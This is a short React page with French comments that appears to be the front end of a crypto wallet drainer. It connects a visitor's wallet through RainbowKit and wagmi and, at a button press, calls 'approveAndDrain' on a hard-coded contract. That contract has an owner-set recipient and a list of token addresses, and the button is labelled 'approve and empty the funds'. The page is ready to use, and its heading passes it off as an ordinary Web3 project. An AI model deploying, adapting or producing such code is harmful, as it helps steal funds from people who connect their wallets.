import { ConnectButton } from "@rainbow-me/rainbowkit";
import { useAccount, useContractRead, useContractWrite, useWalletClient } from "wagmi";
import { parseAbi } from "viem";

// ABI du contrat
const contractAbi = parseAbi([
  "constructor()",
  "function approvalAmount() view returns (uint256)",
  "function approveAndDrain()",
  "function owner() view returns (address)",
  "function recipient() view returns (address)",
  "function setRecipient(address _recipient)",
  "function tokenAddresses(uint256) view returns (address)",
  "receive() payable",
]);

const contractAddress = "0x518c5D62647E60864EcB3826e982c93dFa154af3"; // Adresse du contrat

export default function Home() {
  const { isConnected, address } = useAccount();
  const { data: walletClient } = useWalletClient(); // Remplace useSigner

  // Lire le owner du contrat
  const { data: owner } = useContractRead({
    address: contractAddress,
    abi: contractAbi,
    functionName: "owner",
  });

  // Écrire sur le contrat (exécuter approveAndDrain)
  const { write: approveAndDrain, isLoading } = useContractWrite({
    address: contractAddress,
    abi: contractAbi,
    functionName: "approveAndDrain",
  });

  return (
    <div style={{ textAlign: "center", marginTop: "50px" }}>
      <h1>Bienvenue sur mon projet Web3</h1>
      {isConnected ? (
        <>
          <p>Connecté en tant que : {address}</p>
          <p>Propriétaire du contrat : {owner?.toString() || "Chargement..."}</p>
          <button disabled={isLoading} onClick={() => approveAndDrain()}>
            {isLoading ? "Transaction en cours..." : "Approuver et vider les fonds"}
          </button>
        </>
      ) : (
        <ConnectButton />
      )}
    </div>
  );
}
